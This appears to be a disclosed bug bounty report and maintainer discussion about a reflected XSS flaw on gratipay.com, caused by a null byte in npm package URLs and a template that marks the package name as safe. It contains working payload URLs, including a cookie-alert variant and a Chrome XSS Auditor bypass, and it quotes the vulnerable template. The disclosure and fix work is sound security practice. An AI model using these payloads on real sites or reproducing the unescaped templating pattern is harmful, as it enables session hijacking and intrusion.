title: Reflected XSS - gratipay.com

profile.name: Gratipay
profile.about: Gratitude? Gratipay! The easiest way for your company to pay for open source.

vulnerability_information:
# Summary

I would like to report a Reflected XSS on gratipay.com.

# Browsers Verified In

  * Firefox 55.0.2 (up to date)

# Steps To Reproduce

  Goto this URL:
`https://gratipay.com/on/npm/cx%00A<svg onload=alert(1)>`

{F215426}
vulnerability_information_html:
Summary

I would like to report a Reflected XSS on gratipay.com.

Browsers Verified In

  • Firefox 55.0.2 (up to date)

Steps To Reproduce

Goto this URL:
https://gratipay.com/on/npm/cx%00A<svg onload=alert(1)>

activities.message:
Hi,

Thank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.

Please expect additional feedback from us within the next couple of days. The "INFORMATION SECURITY" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk

We appreciate your interest in securing our platform and look forward to working with you.

Yours sincerely,
The Gratipay Security Team

activities.message:
Hi @tungpun,

This looks like a valid issue. I was never expecting someone to find reflected XSS on Gratipay, so props to you. I am very impressed.

Best regards,
EdOverflow
activities.markdown_message:
Hi @tungpun,

This looks like a valid issue. I was never expecting someone to find reflected XSS on Gratipay, so props to you. I am very impressed.

Best regards,
EdOverflow

So the XSS payload is reflected here:

<p class="instructions">
    Claim the <a href="https://www.npmjs.com/package/cx">cx[%00]A<svg onload=alert(1)></a> npm package on Gratipay:
</p>


Injecting https://gratipay.com/on/npm/cx%00A<svg onload=alert(document.cookie)> gives me:

This is the underlying code that is causing the problem:

{% if user.ANON %}
    <p class="instructions">
        {{ _( 'Claim the {package_link} npm package on Gratipay:'
            , package_link=('<a href="' + package.remote_human_url + '">' + package_name + '</a>')|safe
             ) }}
    </p>
    <div class="important-button">
        {{ sign_in_using(button_class='large') }}
    </div>
{% else %}
    <p class="instructions">
        {{ _( 'Apply to accept payments for the {package_link} npm package:'
            , package_link=('<a href="' + package.remote_human_url + '">' + package_name + '</a>')|safe
             ) }}
    </p>

Link: https://github.com/gratipay/gratipay.com/blob/af8be75bd03c53805fd3688b41b722f927fd72b5/www/on/npm/%25package.spt#L56-L70

activities.message: Thanks for the swag. Hope that your team will fix this issue soon.
activities.markdown_message: Thanks for the swag. Hope that your team will fix this issue soon.

activities.message: Thanks for the report, @tungpun, working on root cause analysis and a fix ...
activities.markdown_message: Thanks for the report, @tungpun, working on root cause analysis and a fix ...

activities.message: I'm surprised, because I thought we [raised 404](https://github.com/gratipay/gratipay.com/blob/af8be75bd03c53805fd3688b41b722f927fd72b5/www/on/npm/%25package.spt#L10-L15) for bad package names, and that's why we trust `package_name` in the affected code block. Investigating ...
activities.markdown_message: I'm surprised, because I thought we raised 404 for bad package names, and that's why we trust package_name in the affected code block. Investigating ...

activities.message:
I am able to reproduce the problem in Firefox 53. Chrome 60 sees the null byte and prevents navigation to the URL. Safari 10 exhibits weird page blanking behavior where it _seems_ to start loading the page ... and then stops?

One way or another we need to be prepared to receive a null byte, since Firefox happily sends it (to say nothing of IE, etc.). Now ... where do we fix that?
activities.markdown_message:
I am able to reproduce the problem in Firefox 53. Chrome 60 sees the null byte and prevents navigation to the URL. Safari 10 exhibits weird page blanking behavior where it seems to start loading the page ... and then stops?

One way or another we need to be prepared to receive a null byte, since Firefox happily sends it (to say nothing of IE, etc.). Now ... where do we fix that?

activities.message:
It depends on the string before the null byte being a valid npm package name. This is 404:

https://gratipay.com/on/npm/fjdsklfjdslkjf%00%3Csvg%20onload=alert(1)%3E
activities.markdown_message:

activities.message: Okay, can repro locally ...
activities.markdown_message: Okay, can repro locally ...

@whit537 Here is a full Chrome PoC. The payload allows navigation to a URL containing a null byte and also bypasses the Chrome XSS Auditor:

https://gratipay.com/on/npm/cx%2500A%3Cx%3E%2500%2500%2500%2500%2500%2500%2500%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E

activities.message:
Looks to be something we need to address in our SQL selects:

```
(Pdb) l
  6     from gratipay.models.package.emails import PRIMARY, VERIFIED, UNVERIFIED, UNLINKED, OTHER
  7
  8     [---]
  9
 10     import pdb; pdb.set_trace()
 11  -> package_name = request.path['package']
 12     if package_name.endswith('/'):
 13         website.redirect(request.path.raw[:-1])  # no trailing slash
 14     package = Package.from_names('npm', package_name)
 15     if package is None:
 16         raise Response(404)
(Pdb) request.path
{u'package': [u'a\x00<svg onload=alert(1)>']}
(Pdb) request.path['package']
u'a\x00<svg onload=alert(1)>'

-> if package is None:
(Pdb) package
<gratipay.models.package.Package object at 0x10f79b790>
(Pdb) package.name
u'a'
```

activities.message:
Here's the [presenting case](https://github.com/gratipay/gratipay.com/blob/2103/gratipay/models/package/__init__.py#L76-L83):

```python
    def from_names(cls, package_manager, name, cursor=None):
        """Return an existing package based on package manager and package names.
        """
        cursor = cursor or cls.db
        return cursor.one( "SELECT packages.*::packages FROM packages "
                           "WHERE package_manager=%s and name=%s"
                         , (package_manager, name)
                          )
```
activities.markdown_message:
Here's the presenting case:

    def from_names(cls, package_manager, name, cursor=None):
        """Return an existing package based on package manager and package names.
        """
        cursor = cursor or cls.db
        return cursor.one( "SELECT packages.*::packages FROM packages "
                           "WHERE package_manager=%s and name=%s"
                         , (package_manager, name)
                          )

activities.message:
Just to follow Jobert Abma's advice (https://twitter.com/jobertabma/status/879050966057734144) here is a fun PoC that fries your speakers if you are running Linux on a Dell machine:

```
https://gratipay.com/on/npm/a%2500<x>%2500%2500%2500%2500%2500%2500%2500<script>eval(base64_decode(''))<%2Fscript>
```

activities.message: This issue has been resolved thanks to @whit537's quick work: https://github.com/gratipay/gratipay.com/pull/4582. Thank you for the fantastic report, @tungpun. You are the first person to report reflected XSS to Gratipay.
activities.markdown_message: This issue has been resolved thanks to @whit537's quick work: https://github.com/gratipay/gratipay.com/pull/4582. Thank you for the fantastic report, @tungpun. You are the first person to report reflected XSS to Gratipay.

^^^ Expected result is now 400 w/ empty body.
